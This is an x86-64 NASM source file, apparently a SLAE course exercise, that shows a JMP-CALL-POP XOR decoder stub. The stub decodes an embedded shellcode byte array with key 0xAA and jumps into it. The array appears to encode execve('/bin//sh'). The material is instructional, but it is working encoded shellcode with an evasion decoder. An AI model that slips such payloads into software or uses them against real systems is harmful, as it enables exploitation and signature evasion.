; File: xor-decoder-maker.nasm
; Author: Kevin Ren, originally professor viviek of SLAE
; Purpose: to demostrate decoding of xor ecoded shellcode and 
; 		execute without hardcode length by using a marker

; NOTE: we will use the JMP CALL POP Technique to manipulate and decode our encoded shellcode
; NOTE: this method will result in seg fault if compiled and ran without a shellcode skeleton, because we are overwritting text section

; editted for 64 bit mode, uses rsi instead of esi

global _start

section .text
_start:
	jmp short call_decoder

decoder:
	pop rsi				; esi has the address that points to Shellcode (encoded)
decode:
	xor byte [rsi], 0xAA		; XORing the first byte of what is stored at ESI address
	jz shellcode			; if XORing results in 0, as with marker, ZF will set and this will transfer control to Shellcode
	inc rsi				; if not at marker yet, we will increment esi by a byte
	jmp short decode		; and unconditionally jump to Decode label again


call_decoder:
	call decoder
	shellcode: db 0xe2,0x9b,0x6a,0xe2,0x9b,0x71,0x1a,0x91,0xf9,0xe2,0x13,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xfb,0xe2,0x23,0x4d,0xf9,0xfd,0xe2,0x23,0x4c,0xf9,0xe2,0x23,0x48,0xa5,0xaf,0xaa			; 0xaa is our last marker because its the string we XORed against during encoding, and will result in zero

